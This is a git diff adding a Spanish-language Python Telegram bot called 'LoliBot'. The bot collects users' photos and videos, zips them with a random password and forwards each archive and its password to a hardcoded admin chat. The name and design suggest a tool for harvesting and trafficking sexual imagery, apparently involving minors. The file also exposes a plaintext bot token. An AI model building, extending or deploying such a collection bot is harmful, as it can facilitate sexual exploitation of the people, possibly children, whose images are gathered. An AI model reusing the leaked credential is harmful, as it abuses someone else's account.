@@ -1,0 +1,229 @@
+import os
+import shutil
+import random
+import string
+import pyminizip
+import asyncio
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    ApplicationBuilder, MessageHandler, CommandHandler,
+    CallbackQueryHandler, ContextTypes, filters
+)
+
+# Configuración
+TOKEN = '7540664921:AAHknaL-PjgBch3d4wnIgon9xzrisxirSEM'
+ADMIN_CHAT_ID = 7536359689
+BASE_DIR = "archivos_bot"
+os.makedirs(BASE_DIR, exist_ok=True)
+
+# Estado por usuario
+nombres_zip = {}
+archivos_temp = {}
+contador = {}
+mensaje_subida_id = {}
+estado_subida = {}
+tiempo_ultima_subida = {}
+
+# Instrucciones con /start
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    texto = (
+        "👋 *LoliBot*\n\n"
+        "1️⃣ Escribe un nombre para tu archivo ZIP (por ejemplo: `maria videos`)\n"
+        "2️⃣ Luego, envía las fotos o videos\n"
+        "3️⃣ Cuando termines, presiona *✅ Terminar y enviar* o escribe `/terminar`\n\n"
+        "También puedes usar `/reiniciar` o `/cancelar`"
+    )
+    await update.message.reply_text(texto, parse_mode="Markdown")
+
+# Guardar nombre ZIP
+async def guardar_nombre(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    nombre = update.message.text.strip().replace(" ", "_")
+    carpeta = os.path.join(BASE_DIR, f"user_{user_id}")
+    os.makedirs(carpeta, exist_ok=True)
+
+    nombres_zip[user_id] = nombre
+    archivos_temp[user_id] = carpeta
+    contador[user_id] = 0
+    estado_subida[user_id] = False
+    mensaje_subida_id[user_id] = None
+
+    botones = [
+        [InlineKeyboardButton("✅ Terminar y enviar", callback_data="terminar_envio")],
+        [
+            InlineKeyboardButton("/reiniciar", callback_data="reiniciar"),
+            InlineKeyboardButton("/cancelar", callback_data="cancelar")
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(botones)
+
+    await update.message.reply_text(
+        f"📝 Nombre asignado: *{nombre}*\nAhora envía las fotos o videos.",
+        parse_mode="Markdown",
+        reply_markup=reply_markup
+    )
+
+# Recibir archivos multimedia
+async def recibir_archivo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    carpeta = archivos_temp.get(user_id)
+    if not carpeta:
+        await update.message.reply_text("⚠️ Primero escribe un nombre para tu archivo ZIP.")
+        return
+
+    file = None
+    ext = ""
+    if update.message.photo:
+        file = await update.message.photo[-1].get_file()
+        ext = ".jpg"
+    elif update.message.video:
+        file = await update.message.video.get_file()
+        ext = ".mp4"
+    elif update.message.document and update.message.document.file_name.endswith(".zip"):
+        file = await update.message.document.get_file()
+        ext = ".zip"
+    else:
+        return
+
+    n = contador.get(user_id, 0) + 1
+    contador[user_id] = n
+    path = os.path.join(carpeta, f"{n}{ext}")
+    await file.download_to_drive(path)
+
+    estado_subida[user_id] = True
+    tiempo_ultima_subida[user_id] = asyncio.get_event_loop().time()
+
+    # Actualizar o crear mensaje de subida
+    if mensaje_subida_id.get(user_id):
+        try:
+            await context.bot.edit_message_text(
+                chat_id=update.effective_chat.id,
+                message_id=mensaje_subida_id[user_id],
+                text=f"📤 Subiendo archivos ({n})"
+            )
+        except:
+            pass
+    else:
+        msg = await update.message.reply_text(f"📤 Subiendo archivos ({n})")
+        mensaje_subida_id[user_id] = msg.message_id
+
+    # Verifica final automáticamente
+    await verificar_final(update, context, user_id)
+
+# Esperar unos segundos para ver si el usuario terminó
+async def verificar_final(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
+    await asyncio.sleep(3)
+    ahora = asyncio.get_event_loop().time()
+    tiempo_ultimo = tiempo_ultima_subida.get(user_id, 0)
+
+    if ahora - tiempo_ultimo >= 3 and estado_subida.get(user_id):
+        estado_subida[user_id] = False
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Archivos listos")
+
+# Botones inline
+async def boton_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
+    await query.answer()
+
+    if data == "terminar_envio":
+        await terminar(update, context, True)
+    elif data == "reiniciar":
+        await reiniciar(update, context, True)
+    elif data == "cancelar":
+        await cancelar(update, context, True)
+
+# /terminar - genera ZIP y lo envía
+async def terminar(update: Update, context: ContextTypes.DEFAULT_TYPE, triggered_by_button=False):
+    user = update.effective_user
+    user_id = user.id
+    nombre_base = nombres_zip.get(user_id)
+    carpeta = archivos_temp.get(user_id)
+
+    if not nombre_base or not carpeta:
+        msg = "⚠️ No hay archivos para enviar. Escribe un nombre y sube contenido."
+        if triggered_by_button:
+            await update.callback_query.edit_message_text(msg)
+        else:
+            await update.message.reply_text(msg)
+        return
+
+    zip_path = os.path.join(BASE_DIR, f"{nombre_base}.zip")
+    archivos = []
+    nombres = []
+    for f in os.listdir(carpeta):
+        ruta = os.path.join(carpeta, f)
+        archivos.append(ruta)
+        nombres.append(f)
+
+    password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+    pyminizip.compress_multiple(archivos, nombres, zip_path, password, 5)
+
+    await context.bot.send_document(
+        chat_id=ADMIN_CHAT_ID,
+        document=open(zip_path, 'rb'),
+        caption=f"📦 ZIP de {user.first_name}: `{nombre_base}.zip`\n🔑 Contraseña: `{password}`",
+        parse_mode="Markdown"
+    )
+
+    confirm = "📬 Tus archivos fueron enviados con contraseña. ¡Gracias!"
+    if triggered_by_button:
+        await update.callback_query.edit_message_text(confirm)
+    else:
+        await update.message.reply_text(confirm)
+
+    # Limpiar datos
+    for d in [nombres_zip, archivos_temp, contador, mensaje_subida_id, estado_subida, tiempo_ultima_subida]:
+        d.pop(user_id, None)
+    shutil.rmtree(carpeta)
+    os.remove(zip_path)
+
+# /reiniciar
+async def reiniciar(update: Update, context: ContextTypes.DEFAULT_TYPE, triggered_by_button=False):
+    user_id = update.effective_user.id
+    carpeta = archivos_temp.get(user_id)
+    if carpeta and os.path.exists(carpeta):
+        shutil.rmtree(carpeta)
+
+    for d in [nombres_zip, archivos_temp, contador, mensaje_subida_id, estado_subida, tiempo_ultima_subida]:
+        d.pop(user_id, None)
+
+    msg = "🔁 Proceso reiniciado. Escribe un nuevo nombre para comenzar."
+    if triggered_by_button:
+        await update.callback_query.edit_message_text(msg)
+    else:
+        await update.message.reply_text(msg)
+
+# /cancelar
+async def cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE, triggered_by_button=False):
+    user_id = update.effective_user.id
+    carpeta = archivos_temp.get(user_id)
+    if carpeta and os.path.exists(carpeta):
+        shutil.rmtree(carpeta)
+
+    for d in [nombres_zip, archivos_temp, contador, mensaje_subida_id, estado_subida, tiempo_ultima_subida]:
+        d.pop(user_id, None)
+
+    msg = "❌ Proceso cancelado. Puedes comenzar cuando quieras."
+    if triggered_by_button:
+        await update.callback_query.edit_message_text(msg)
+    else:
+        await update.message.reply_text(msg)
+
+# Lanzar bot
+app = ApplicationBuilder().token(TOKEN).build()
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("terminar", terminar))
+app.add_handler(CommandHandler("reiniciar", reiniciar))
+app.add_handler(CommandHandler("cancelar", cancelar))
+app.add_handler(CallbackQueryHandler(boton_callback))
+app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), guardar_nombre))
+app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO | filters.Document.ZIP, recibir_archivo))
+
+print("🤖 Bot corriendo... esperando archivos")
+app.run_polling()
+
+
+
+
+
